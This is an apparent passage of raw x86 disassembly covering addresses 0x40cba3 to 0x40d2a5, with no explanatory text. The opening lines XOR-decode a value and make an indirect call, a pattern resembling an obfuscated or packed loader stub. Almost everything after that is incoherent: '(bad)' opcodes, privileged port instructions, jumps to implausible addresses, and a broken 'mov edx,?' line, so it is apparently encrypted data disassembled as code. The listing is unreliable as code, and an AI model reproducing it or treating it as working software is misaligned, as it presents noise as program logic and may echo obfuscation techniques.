  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x15]
  40cbfc:	mov    al,0xc5
  40cbfe:	sub    ah,BYTE PTR [edx-0x74]
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	mov    dl,0x63
  40cc09:	jp     0x40cbbb
  40cc0b:	cmc    
  40cc0c:	jp     0x40cbe3
  40cc0e:	aaa    
  40cc0f:	in     eax,0x39
  40cc11:	xchg   edi,eax
  40cc12:	adc    al,0xd9
  40cc14:	aam    0x3c
  40cc16:	and    DWORD PTR [ebx-0xf],esi
  40cc19:	mov    esp,eax
  40cc1b:	cmp    DWORD PTR [edx],ebx
  40cc1d:	stc    
  40cc1e:	inc    edx
  40cc1f:	leave  
  40cc20:	pop    ecx
  40cc21:	lea    ebp,[esi-0x7c]
  40cc24:	aaa    
  40cc25:	(bad)  [eax]
  40cc27:	and    bh,cl
  40cc29:	xlat   BYTE PTR ds:[ebx]
  40cc2a:	xor    eax,0x1f350e7b
  40cc2f:	push   eax
  40cc30:	add    esi,DWORD PTR [esi]
  40cc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc33:	test   al,0xdc
  40cc35:	inc    ebx
  40cc36:	inc    edi
  40cc37:	add    esi,DWORD PTR [ecx]
  40cc39:	(bad)  
  40cc3a:	idiv   ebp
  40cc3c:	out    dx,eax
  40cc3d:	mov    al,0xc3
  40cc3f:	jecxz  0x40cbfe
  40cc41:	in     eax,dx
  40cc42:	retf   
  40cc43:	scas   eax,DWORD PTR es:[edi]
  40cc44:	pop    edx
  40cc45:	mov    ds:0x358e9b1e,eax
  40cc4a:	pop    esp
  40cc4b:	push   edx
  40cc4c:	mov    al,ds:0xf21aec0c
  40cc51:	shl    BYTE PTR [edi+esi*8-0x3a],0xde
  40cc56:	sub    DWORD PTR ss:0xe5bfb6d7,edi
  40cc5d:	test   al,0x53
  40cc5f:	lods   eax,DWORD PTR ds:[esi]
  40cc60:	push   0xb
  40cc62:	cmp    al,0xb8
  40cc64:	dec    esi
  40cc65:	and    eax,0xd90fd51
  40cc6a:	dec    eax
  40cc6b:	pop    ds
  40cc6c:	retf   
  40cc6d:	cmp    al,0x3d
  40cc6f:	push   cs
  40cc70:	out    dx,eax
  40cc71:	jo     0x40cc51
  40cc73:	jb     0x40cc79
  40cc75:	push   edi
  40cc76:	dec    ebp
  40cc77:	stos   BYTE PTR es:[edi],al
  40cc78:	popf   
  40cc79:	xchg   edx,eax
  40cc7a:	or     al,0x2a
  40cc7c:	ins    DWORD PTR es:[edi],dx
  40cc7d:	int    0x12
  40cc7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc80:	dec    esp
  40cc81:	xchg   edi,eax
  40cc82:	inc    edi
  40cc83:	push   es
  40cc84:	loop   0x40cc92
  40cc86:	pop    es
  40cc87:	add    dl,BYTE PTR [edi+edx*4-0x71]
  40cc8b:	push   cs
  40cc8c:	inc    edi
  40cc8d:	inc    esp
  40cc8e:	dec    edx
  40cc8f:	mov    edx,0x7fc57265
  40cc94:	jmp    0x40cc3c
  40cc96:	out    dx,eax
  40cc97:	xor    eax,0x62eb7c6c
  40cc9c:	mov    dl,0x91
  40cc9e:	loope  0x40cca9
  40cca0:	test   eax,0x28bfbb9f
  40cca5:	inc    esp
  40cca6:	sbb    cl,ah
  40cca8:	add    eax,0xdcfed16e
  40ccad:	in     eax,0x3a
  40ccaf:	mov    al,ss:0x5721cbb4
  40ccb5:	out    0x6e,eax
  40ccb7:	ret    0x2b3c
  40ccba:	int    0x56
  40ccbc:	dec    esp
  40ccbd:	mov    ds:0x1f238ac2,al
  40ccc2:	fisubr DWORD PTR [ecx]
  40ccc4:	cmp    BYTE PTR [esi-0x1a],bl
  40ccc7:	dec    esp
  40ccc8:	jmp    0x40cc79
  40ccca:	adc    DWORD PTR [esi-0x5e],esi
  40cccd:	push   ebx
  40ccce:	add    BYTE PTR [ecx],0x29
  40ccd1:	retf   
  40ccd2:	ins    BYTE PTR es:[edi],dx
  40ccd3:	std    
  40ccd4:	ss in  eax,dx
  40ccd6:	shl    BYTE PTR [esi],0xef
  40ccd9:	neg    DWORD PTR [esi]
  40ccdb:	fidivr DWORD PTR [eax+0x43f76bfb]
  40cce1:	addr16 mov edi,0x1d9c7eb8
  40cce7:	sbb    BYTE PTR [edx+0xb],0xec
  40cceb:	push   edi
  40ccec:	mov    ah,0x7e
  40ccee:	ror    BYTE PTR [edi-0x77],cl
  40ccf1:	jmp    0xb3809653
  40ccf6:	mov    ah,BYTE PTR [esi-0x2f]
  40ccf9:	pop    es
  40ccfa:	mov    cl,0xb6
  40ccfc:	out    dx,eax
  40ccfd:	popf   
  40ccfe:	je     0x40cd37
  40cd00:	mov    dl,0x92
  40cd02:	inc    ebx
  40cd03:	push   esp
  40cd04:	mov    eax,DWORD PTR [ebx+0x1468f98f]
  40cd0a:	icebp  
  40cd0b:	pop    ss
  40cd0c:	mov    ebx,0x33168d09
  40cd11:	cmp    eax,0xc68be5ed
  40cd16:	mov    al,0x71
  40cd18:	xchg   edi,eax
  40cd19:	jle    0x40cd37
  40cd1b:	fwait
  40cd1c:	les    edx,FWORD PTR [edi]
  40cd1e:	pop    es
  40cd1f:	and    edx,esp
  40cd21:	push   cs
  40cd22:	lea    esp,[eax]
  40cd24:	sbb    eax,0x11d73462
  40cd29:	(bad)  
  40cd2b:	dec    esi
  40cd2c:	mov    edi,0xf2149e85
  40cd31:	xor    cl,cl
  40cd33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd34:	lock sti 
  40cd36:	pop    ebp
  40cd37:	dec    esi
  40cd38:	lods   eax,DWORD PTR ds:[esi]
  40cd39:	shl    DWORD PTR [edx-0x7f],cl
  40cd3c:	xor    eax,0x4eb4cb87
  40cd41:	and    eax,0xc471632f
  40cd46:	inc    esp
  40cd47:	jb     0x40ccf7
  40cd49:	arpl   WORD PTR [ecx+0x6139c8d6],dx
  40cd4f:	call   0x463fa3f5
  40cd54:	cmc    
  40cd55:	fsubr  QWORD PTR [edi]
  40cd57:	out    dx,al
  40cd58:	shr    dh,cl
  40cd5a:	xchg   ecx,eax
  40cd5b:	scas   al,BYTE PTR es:[edi]
  40cd5c:	dec    ecx
  40cd5d:	out    dx,eax
  40cd5e:	sbb    esi,DWORD PTR [ecx]
  40cd60:	dec    esp
  40cd61:	push   eax
  40cd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd63:	jb     0x40cd5a
  40cd65:	dec    edi
  40cd66:	push   eax
  40cd67:	bound  esp,QWORD PTR [edi-0x31439c6d]
  40cd6d:	adc    eax,0xa39effba
  40cd72:	push   ds
  40cd73:	iret   
  40cd74:	mov    ebp,0x1d503a8f
  40cd79:	xchg   BYTE PTR [ebp-0x75f03d98],dl
  40cd7f:	std    
  40cd80:	fnstcw WORD PTR [eax+0x23]
  40cd83:	push   es
  40cd84:	popa   
  40cd85:	or     al,0xb0
  40cd87:	into   
  40cd88:	push   esp
  40cd89:	clc    
  40cd8a:	cld    
  40cd8b:	mov    ah,0xe8
  40cd8d:	ins    DWORD PTR es:[edi],dx
  40cd8e:	mov    eax,0xb0b33815
  40cd93:	popf   
  40cd94:	sti    
  40cd95:	push   ds
  40cd96:	push   edi
  40cd97:	and    bh,cl
  40cd99:	ror    BYTE PTR [ebp+0x1b],0x66
  40cd9d:	sar    DWORD PTR [esi+0x17],0x18
  40cda1:	inc    ecx
  40cda2:	cmp    dh,BYTE PTR ds:0x2b3460f3
  40cda8:	lock inc edi
  40cdaa:	sar    ecx,cl
  40cdac:	pop    ds
  40cdad:	jno    0x40ce04
  40cdaf:	cld    
  40cdb0:	jno    0x40cdcc
  40cdb2:	xor    BYTE PTR [ecx+0x7c345a26],ch
  40cdb8:	inc    eax
  40cdb9:	in     al,0x20
  40cdbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdbc:	push   esp
  40cdbd:	mov    ebx,0x24a1008d
  40cdc2:	or     ecx,DWORD PTR [edx]
  40cdc4:	push   ebx
  40cdc5:	stc    
  40cdc6:	jle    0x40ce0b
  40cdc8:	rol    BYTE PTR ds:0xafe1269a,1
  40cdce:	mov    ah,bh
  40cdd0:	pushf  
  40cdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd2:	cdq    
  40cdd3:	sub    cl,BYTE PTR [eax-0x71363809]
  40cdd9:	aam    0x22
  40cddb:	dec    ebp
  40cddc:	(bad)  
  40cddd:	mov    ds:0x6e2c295,al
  40cde2:	inc    edx
  40cde3:	jl     0x40cdb9
  40cde5:	adc    edi,ebx
  40cde7:	fisub  WORD PTR [eax+0x65d7fe25]
  40cded:	adc    al,0xcd
  40cdef:	int3   
  40cdf0:	in     al,dx
  40cdf1:	xchg   ebp,eax
  40cdf2:	push   ecx
  40cdf3:	fs dec esp
  40cdf5:	pop    edx
  40cdf6:	mov    esi,0x22de99e5
  40cdfb:	mov    ebp,0xe976dcb8
  40ce00:	dec    edx
  40ce01:	push   edi
  40ce02:	iret   
  40ce03:	je     0x40ce39
  40ce05:	xchg   edi,eax
  40ce06:	dec    ebx
  40ce07:	arpl   WORD PTR [ecx+0x7844158e],bp
  40ce0d:	cmp    DWORD PTR [edx-0x7e],esp
  40ce10:	mov    ch,0xbd
  40ce12:	leave  
  40ce13:	mov    DWORD PTR [eax],ecx
  40ce15:	mov    al,0x7c
  40ce17:	adc    DWORD PTR [eax],edi
  40ce19:	rcl    BYTE PTR [ebx+esi*8+0x728e76db],0xf1
  40ce21:	jae    0x40cdfe
  40ce23:	lea    esp,[esi+0x3b]
  40ce26:	or     ebx,edx
  40ce28:	and    edx,ebx
  40ce2a:	ins    BYTE PTR es:[edi],dx
  40ce2b:	std    
  40ce2c:	loopne 0x40ce22
  40ce2e:	jmp    0xd853a08
  40ce33:	mov    bl,0xe1
  40ce35:	dec    eax
  40ce36:	out    dx,al
  40ce37:	cdq    
  40ce38:	aam    0x26
  40ce3a:	sti    
  40ce3b:	mov    edi,cr2
  40ce3e:	ds push edx
  40ce40:	mov    cl,0xf1
  40ce42:	stos   BYTE PTR es:[edi],al
  40ce43:	and    edx,edi
  40ce45:	push   cs
  40ce46:	gs dec eax
  40ce48:	jno    0x40ce21
  40ce4a:	mov    ds:0xd92bdbcb,al
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	(bad)  
  40ce64:	push   ebx
  40ce65:	push   0x2c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	sbb    ebx,esp
  40ce70:	rcl    BYTE PTR [eax+0x7d],1
  40ce73:	xchg   esp,eax
  40ce74:	xlat   BYTE PTR ds:[ebx]
  40ce75:	outs   dx,DWORD PTR ds:[esi]
  40ce76:	sti    
  40ce77:	pop    esi
  40ce78:	gs addr16 call 0x4aa0:0x5e216c22
  40ce81:	inc    esp
  40ce82:	in     eax,dx
  40ce83:	ins    DWORD PTR es:[edi],dx
  40ce84:	mov    edi,0x606b3b26
  40ce89:	push   edi
  40ce8a:	push   ecx
  40ce8b:	inc    esi
  40ce8c:	inc    esp
  40ce8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce8e:	inc    ecx
  40ce8f:	test   DWORD PTR [ecx+0x55d64d19],ebx
  40ce95:	mov    esi,0x4ea0156d
  40ce9a:	aad    0xa2
  40ce9c:	cwde   
  40ce9d:	pop    es
  40ce9e:	iret   
  40ce9f:	inc    esi
  40cea0:	mov    ebx,0x7b096826
  40cea5:	mov    bh,0xc7
  40cea7:	adc    ah,al
  40cea9:	cdq    
  40ceaa:	cmp    edx,ebx
  40ceac:	int3   
  40cead:	pop    ebx
  40ceae:	mov    dh,0xd3
  40ceb0:	sti    
  40ceb1:	push   ecx
  40ceb2:	mov    bl,0xe8
  40ceb5:	pop    ebp
  40ceb6:	pop    ds
  40ceb7:	add    al,0xff
  40ceb9:	sahf   
  40ceba:	ins    DWORD PTR es:[edi],dx
  40cebb:	or     BYTE PTR [eax],dl
  40cebd:	mov    ah,0x5a
  40cebf:	pop    ds
  40cec0:	fs in  al,0x21
  40cec3:	or     BYTE PTR [edi],bl
  40cec5:	stc    
  40cec6:	adc    ecx,esi
  40cec8:	add    eax,0x3f820406
  40cecd:	inc    esi
  40cece:	mov    bl,0x9e
  40ced0:	sbb    al,0x20
  40ced2:	pshufw mm7,QWORD PTR [edi],0x17
  40ced6:	int    0x2d
  40ced8:	xor    dl,BYTE PTR [ebp-0x14]
  40cedb:	pop    ds
  40cedc:	bound  eax,QWORD PTR [edi+ebp*2-0x3a0842da]
  40cee3:	lock jne 0x40cefa
  40cee6:	jbe    0x40ce98
  40cee8:	aas    
  40cee9:	jno    0x40cf14
  40ceeb:	rol    DWORD PTR [eax+0x7e],cl
  40ceee:	mov    WORD PTR [edx+eax*2],gs
  40cef1:	lods   eax,DWORD PTR ds:[esi]
  40cef2:	addr16 in eax,dx
  40cef4:	mov    edi,0x20d7359e
  40cef9:	imul   edx,ecx,0x24
  40cefc:	jno    0x40ceb3
  40cefe:	cmp    ecx,ebp
  40cf00:	mul    BYTE PTR [ebx+0x6b2b2f42]
  40cf06:	dec    esp
  40cf07:	adc    DWORD PTR [edx-0x3aee38f6],ecx
  40cf0d:	dec    ebx
  40cf0e:	dec    esi
  40cf0f:	xchg   ecx,eax
  40cf10:	sub    al,0xa1
  40cf12:	or     ebp,DWORD PTR [ecx]
  40cf14:	xchg   BYTE PTR [ebx+0x4cae7d77],dh
  40cf1a:	mov    al,ds:0xf7ba1f4a
  40cf1f:	sqrtps xmm4,XMMWORD PTR [esi]
  40cf22:	add    eax,0x9a0b2b4d
  40cf27:	popa   
  40cf28:	push   eax
  40cf29:	cmc    
  40cf2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf2b:	xchg   esp,eax
  40cf2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf2d:	icebp  
  40cf2e:	mov    esi,0xd9f94e6f
  40cf33:	scas   eax,DWORD PTR es:[edi]
  40cf34:	xchg   esp,eax
  40cf35:	jb     0x40cf85
  40cf37:	push   ebx
  40cf38:	(bad)  
  40cf39:	xchg   ecx,eax
  40cf3a:	pop    eax
  40cf3b:	add    ah,BYTE PTR [ebx-0x68]
  40cf3e:	rcr    dl,1
  40cf40:	sbb    BYTE PTR [ebx+0x63],cl
  40cf43:	xor    BYTE PTR [ecx-0x5d6e6ee],bl
  40cf49:	xchg   edx,eax
  40cf4a:	xor    esp,ebp
  40cf4c:	sub    esi,ecx
  40cf4e:	lahf   
  40cf4f:	pop    ebp
  40cf50:	popf   
  40cf51:	jg     0x40cf8e
  40cf53:	aaa    
  40cf54:	sub    ah,cl
  40cf56:	dec    ebp
  40cf57:	mov    ebx,0x127db05
  40cf5c:	inc    eax
  40cf5d:	or     edi,DWORD PTR cs:[edi+0x36]
  40cf61:	xlat   BYTE PTR ds:[ebx]
  40cf62:	shl    bh,cl
  40cf64:	inc    ecx
  40cf65:	gs addr16 (bad) 
  40cf68:	ins    DWORD PTR es:[edi],dx
  40cf69:	pushaw 
  40cf6b:	bound  ebp,QWORD PTR [edi]
  40cf6d:	pop    esi
  40cf6e:	xchg   edx,eax
  40cf6f:	aad    0xd9
  40cf71:	adc    BYTE PTR fs:[edx],0xf4
  40cf75:	adc    al,0xdb
  40cf77:	in     eax,dx
  40cf78:	sbb    esi,DWORD PTR [esi]
  40cf7a:	and    al,0x46
  40cf7c:	xor    al,0xf0
  40cf7e:	mov    BYTE PTR [edx+0x6c146e38],bh
  40cf84:	pop    eax
  40cf85:	aad    0xdf
  40cf87:	sbb    al,0xd
  40cf89:	(bad)  
  40cf8a:	push   ebp
  40cf8b:	mov    esp,0x9d4d55b5
  40cf90:	sub    dh,BYTE PTR [esi+0x1beb4d9a]
  40cf96:	scas   eax,DWORD PTR es:[edi]
  40cf97:	push   edx
  40cf98:	cwde   
  40cf99:	fmul   QWORD PTR [ecx-0x51]
  40cf9c:	in     al,dx
  40cf9d:	call   0x3613e193
  40cfa2:	fwait
  40cfa3:	or     eax,0x685a42b4
  40cfa8:	or     eax,0xf8b4da67
  40cfad:	fld    TBYTE PTR [ebp+0x1c]
  40cfb0:	xor    ebx,edx
  40cfb2:	out    0xa0,eax
  40cfb4:	pop    eax
  40cfb5:	sub    dh,dh
  40cfb7:	push   ebp
  40cfb8:	mov    bh,BYTE PTR [ecx]
  40cfba:	xchg   BYTE PTR [edx],dl
  40cfbc:	retf   0xf8e0
  40cfbf:	loop   0x40cf94
  40cfc1:	jl     0x40cfbc
  40cfc3:	xor    eax,0xb0249406
  40cfc8:	xchg   esi,eax
  40cfc9:	jmp    0x40d001
  40cfcb:	sub    esi,ebx
  40cfcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfce:	pop    edi
  40cfcf:	stos   DWORD PTR es:[edi],eax
  40cfd0:	mov    ebx,eax
  40cfd2:	iret   
  40cfd3:	adc    bl,BYTE PTR [edi-0x3948baa0]
  40cfd9:	xor    BYTE PTR [ecx-0x49],bl
  40cfdc:	arpl   WORD PTR [edi],dx
  40cfde:	and    al,0x65
  40cfe0:	jae    0x40cf94
  40cfe2:	les    ebx,FWORD PTR ds:0x38a0ef2a
  40cfe8:	ficomp DWORD PTR ds:0xd3e340b7
  40cfee:	mov    ecx,0x208af1f2
  40cff3:	mov    ebp,DWORD PTR [ebx-0x4]
  40cff6:	jns    0x40d024
  40cff8:	pop    ecx
  40cff9:	int    0x22
  40cffb:	les    ebx,FWORD PTR [ecx-0x28]
  40cffe:	or     al,BYTE PTR [edi]
  40d000:	push   edi
  40d001:	lds    eax,FWORD PTR [ebp-0x1]
  40d004:	sub    edx,DWORD PTR [ebx+0x901eac5]
  40d00a:	pop    edi
  40d00b:	cmp    al,0x3b
  40d00d:	arpl   WORD PTR [esi-0x42],ax
  40d010:	jne    0x40d091
  40d012:	sub    esi,DWORD PTR [esi-0x46]
  40d015:	push   edx
  40d016:	dec    ecx
  40d017:	repz mov esi,0xa344e9de
  40d01d:	add    ch,BYTE PTR [esi+0x71]
  40d020:	push   es
  40d021:	cmp    DWORD PTR [ecx+edx*8-0x2c],edx
  40d025:	sbb    cl,BYTE PTR [ecx+0x29271ad7]
  40d02b:	add    DWORD PTR [eax+0x5e],esp
  40d02e:	sub    al,0xb0
  40d030:	ud2    
  40d032:	cli    
  40d033:	hlt    
  40d034:	fsub   DWORD PTR [edi]
  40d036:	pop    ss
  40d037:	mov    ah,0x9
  40d039:	sub    dh,cl
  40d03b:	es and cl,dl
  40d03e:	ror    BYTE PTR [ebp-0x3a6337df],1
  40d044:	add    DWORD PTR [edx-0x2e28e6e4],esi
  40d04a:	loop   0x40d015
  40d04c:	or     al,0xa7
  40d04e:	push   ebx
  40d04f:	mov    DWORD PTR [ebp-0x5e],ecx
  40d052:	ficom  DWORD PTR [ecx-0xc923335]
  40d058:	sbb    al,0x48
  40d05a:	leave  
  40d05b:	sahf   
  40d05c:	shl    DWORD PTR [esi],cl
  40d05e:	and    al,0xa1
  40d060:	outs   dx,BYTE PTR ds:[esi]
  40d061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d062:	sti    
  40d063:	call   0xe4f2e220
  40d068:	enter  0x1e03,0x72
  40d06c:	ds jbe 0x40d0a2
  40d06f:	pusha  
  40d070:	outs   dx,BYTE PTR ds:[esi]
  40d071:	daa    
  40d072:	out    dx,al
  40d073:	daa    
  40d074:	mov    al,BYTE PTR [edx-0x7d]
  40d077:	push   ss
  40d078:	jo     0x40d0ec
  40d07a:	mov    bl,0x39
  40d07c:	xor    DWORD PTR [ebp-0x7e],esp
  40d07f:	push   ecx
  40d080:	fwait
  40d081:	sbb    ebx,DWORD PTR [ebx+edx*4+0x6d4f87a9]
  40d088:	sub    dh,BYTE PTR [eax]
  40d08a:	adc    esi,DWORD PTR [edx+0x33f58679]
  40d090:	jle    0x40d04c
  40d092:	inc    esi
  40d093:	imul   ebp,DWORD PTR [edx+0x72],0x11
  40d097:	neg    BYTE PTR [edi+0x70]
  40d09a:	call   0xb0e5:0x378299f7
  40d0a1:	push   edx
  40d0a2:	arpl   WORD PTR [esi],di
  40d0a4:	mov    ebx,0xf53971b6
  40d0a9:	mov    al,0x76
  40d0ab:	pushf  
  40d0ac:	fimul  DWORD PTR [eax-0x69a4a724]
  40d0b2:	imul   ecx,DWORD PTR [ebx-0x1bba74b7],0x3c1af0f
  40d0bc:	loopne 0x40d050
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	test   eax,0xf6767fa1
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	xor    eax,eax
  40d0dd:	and    dl,BYTE PTR [edi-0x148b00fd]
  40d0e3:	fldcw  WORD PTR [ecx-0x69]
  40d0e6:	and    BYTE PTR [ecx+0x1cd503cc],bh
  40d0ec:	mov    al,ds:0x8cfca6ed
  40d0f1:	lock retf 
  40d0f3:	xchg   BYTE PTR [ecx-0x41574b48],ch
  40d0f9:	leave  
  40d0fa:	pushf  
  40d0fb:	imul   edx,DWORD PTR [ebp-0x4e],0x614b57c5
  40d102:	in     al,0x94
  40d104:	fwait
  40d105:	pop    edx
  40d106:	loop   0x40d179
  40d108:	arpl   WORD PTR [edi+esi*8-0x63],dx
  40d10c:	and    DWORD PTR [esi+0x69c05ebd],edx
  40d112:	add    DWORD PTR [edx+ecx*1],esp
  40d115:	jnp    0x40d139
  40d117:	inc    ebx
  40d118:	mov    ds:0xfbf35c56,al
  40d11d:	xchg   esp,eax
  40d11e:	inc    ebp
  40d11f:	pop    ecx
  40d120:	test   al,0xed
  40d122:	cmc    
  40d123:	jns    0x40d18e
  40d125:	or     ch,bl
  40d127:	addr16 test al,0xe3
  40d12a:	add    eax,0xd7253ab4
  40d12f:	bound  esp,QWORD PTR [esi-0x4c]
  40d132:	rcr    DWORD PTR [ebp-0x39135f05],1
  40d138:	mov    ah,0x98
  40d13a:	rol    DWORD PTR [edi-0x7c],1
  40d13d:	jmp    0x12d5:0x7045c47d
  40d144:	cmp    BYTE PTR [ebx],dl
  40d146:	pusha  
  40d147:	popa   
  40d148:	lfs    ecx,FWORD PTR [esi+0x781cfc17]
  40d14f:	bound  esi,QWORD PTR [ebx+0x6a]
  40d152:	inc    ebp
  40d153:	scas   al,BYTE PTR es:[edi]
  40d154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d155:	fwait
  40d156:	pop    ds
  40d157:	and    esp,edi
  40d159:	and    esp,esp
  40d15b:	mov    BYTE PTR [ebx+0x31],dh
  40d15e:	cli    
  40d15f:	mov    cl,al
  40d161:	lods   al,BYTE PTR ds:[esi]
  40d162:	xchg   BYTE PTR [edx-0x4],bh
  40d165:	xchg   BYTE PTR [edx+ecx*4],dh
  40d168:	jmp    0x9b61:0x18b70fa7
  40d16f:	je     0x40d1c4
  40d171:	sahf   
  40d172:	xchg   ebp,eax
  40d173:	cvttps2pi mm5,xmm0
  40d176:	and    ah,ch
  40d178:	sbb    al,BYTE PTR [eax]
  40d17a:	aam    0x36
  40d17c:	ficomp WORD PTR ds:0xafaabde4
  40d182:	out    dx,al
  40d183:	inc    edx
  40d184:	in     eax,dx
  40d185:	xchg   ecx,eax
  40d186:	daa    
  40d187:	ficomp DWORD PTR [eax+ecx*1-0xf]
  40d18b:	frstor [esi]
  40d18d:	push   ss
  40d18e:	sbb    BYTE PTR [esi+0x30ee6c52],bl
  40d194:	ret    
  40d195:	xor    al,0xa0
  40d197:	sbb    BYTE PTR [edx+0x64],0xa4
  40d19b:	pop    ebx
  40d19c:	jae    0x40d1ca
  40d19e:	add    eax,DWORD PTR [edi-0x19]
  40d1a1:	pop    es
  40d1a2:	test   DWORD PTR [ebp+0x2876a977],ecx
  40d1a8:	scas   eax,DWORD PTR es:[edi]
  40d1a9:	in     al,dx
  40d1aa:	mov    edx,?
  40d1ac:	cmp    dl,dl
  40d1ae:	inc    esp
  40d1b0:	inc    ebp
  40d1b1:	push   ebp
  40d1b2:	lods   al,BYTE PTR ds:[esi]
  40d1b3:	je     0x40d194
  40d1b5:	adc    eax,0xd7c59e27
  40d1ba:	std    
  40d1bb:	pop    edx
  40d1bc:	mov    eax,0xea9638c
  40d1c1:	ret    0x1a6
  40d1c4:	stos   DWORD PTR es:[edi],eax
  40d1c5:	mov    eax,ds:0x196f1dc2
  40d1ca:	stc    
  40d1cb:	lods   eax,DWORD PTR ds:[esi]
  40d1cc:	mov    bl,0x53
  40d1ce:	push   ebp
  40d1cf:	xchg   ecx,eax
  40d1d0:	inc    edi
  40d1d1:	ds int 0x19
  40d1d4:	sahf   
  40d1d5:	push   esi
  40d1d6:	call   0xe4a5b2bb
  40d1db:	nop
  40d1dc:	and    eax,0x287e4541
  40d1e1:	test   DWORD PTR [eax],edx
  40d1e3:	jno    0x40d16b
  40d1e5:	ins    DWORD PTR es:[edi],dx
  40d1e6:	or     eax,0xd68209fd
  40d1eb:	fucomip st,st(7)
  40d1ed:	imul   eax,ebp,0x68
  40d1f0:	and    eax,0x8d73b1da
  40d1f5:	inc    esi
  40d1f6:	popa   
  40d1f7:	cwde   
  40d1f8:	(bad)  
  40d1f9:	mov    ebp,0x652885fa
  40d1fe:	mov    ds:0x2a7948ac,al
  40d203:	adc    bh,al
  40d205:	xlat   BYTE PTR ds:[ebx]
  40d206:	pusha  
  40d207:	rcl    DWORD PTR [esi-0x51],cl
  40d20a:	mov    al,ds:0xbdab0231
  40d20f:	stc    
  40d210:	mov    ch,0x27
  40d212:	ja     0x40d1b1
  40d214:	shl    BYTE PTR [edi+0x6],1
  40d217:	rcl    DWORD PTR ds:0x236af8f,0x55
  40d21e:	pop    edi
  40d21f:	out    dx,eax
  40d220:	xchg   ebp,eax
  40d221:	push   0xffffffc1
  40d223:	add    al,0xf0
  40d225:	or     esp,DWORD PTR [ecx+0x11]
  40d228:	mov    edx,DWORD PTR [eax]
  40d22a:	out    0x84,eax
  40d22c:	ret    
  40d22d:	jb     0x40d28f
  40d22f:	repz sub BYTE PTR [ebx-0x2b8b9b35],ch
  40d236:	fidivr WORD PTR [eax]
  40d238:	icebp  
  40d239:	sub    eax,0x639fde8
  40d23e:	scas   eax,DWORD PTR es:[edi]
  40d23f:	stc    
  40d240:	pop    esp
  40d241:	push   ebp
  40d242:	push   ebp
  40d243:	lods   eax,DWORD PTR ds:[esi]
  40d244:	sbb    DWORD PTR fs:[esi],ebp
  40d247:	or     DWORD PTR es:[ecx-0x66],eax
  40d24b:	jnp    0x40d281
  40d24d:	and    DWORD PTR [edi],eax
  40d24f:	cs mov edx,0x4358f36e
  40d255:	outs   dx,BYTE PTR ds:[esi]
  40d256:	push   cs
  40d257:	xor    ebp,DWORD PTR [ecx]
  40d259:	xchg   dl,cl
  40d25b:	scas   al,BYTE PTR es:[edi]
  40d25c:	cld    
  40d25d:	loop   0x40d1ea
  40d25f:	adc    DWORD PTR [ebx-0x16a531bb],esp
  40d265:	int3   
  40d266:	dec    ecx
  40d267:	and    edi,DWORD PTR [edx-0x38a82494]
  40d26d:	or     dh,BYTE PTR [ebx+0x11]
  40d270:	or     al,0xd7
  40d272:	out    0xd8,eax
  40d274:	push   ds
  40d275:	call   0x224b:0x3e624783
  40d27c:	or     ecx,edx
  40d27e:	das    
  40d27f:	imul   ebp,DWORD PTR [ebp-0x6fdf8b6d],0xffffffa2
  40d286:	cmp    al,0x98
  40d288:	push   0xe6fbf306
  40d28d:	mov    dh,dl
  40d28f:	scas   eax,DWORD PTR es:[edi]
  40d290:	scas   al,BYTE PTR es:[edi]
  40d291:	lahf   
  40d292:	mov    ds,WORD PTR [esi]
  40d294:	or     dl,BYTE PTR [ecx+0x5a252828]
  40d29a:	jl     0x40d236
  40d29c:	outs   dx,DWORD PTR ds:[esi]
  40d29d:	cmp    BYTE PTR [ebx+edi*2],ah
  40d2a0:	jmp    0x14e41039
  40d2a5:	mov    cl,0x63
